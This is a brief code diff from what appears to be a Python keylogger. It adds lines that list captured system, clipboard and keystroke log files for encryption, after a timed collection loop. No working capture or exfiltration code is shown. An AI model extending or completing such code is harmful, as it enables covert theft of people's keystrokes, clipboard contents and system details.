@@ -171,3 +171,8 @@ while number_of_iterations < number_of_iterations_end:
         number_of_iterations += 1
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
+
+# Encrypting Files
+files_to_encrpt = [file_merge + system_info, file_merge + clipboard_info, file_merge + keys_info]
+encrypted_file_names = [file_merge + system_info_e, file_merge + clipboard_info_e, file_merge + keys_info_e]
+counts = 0
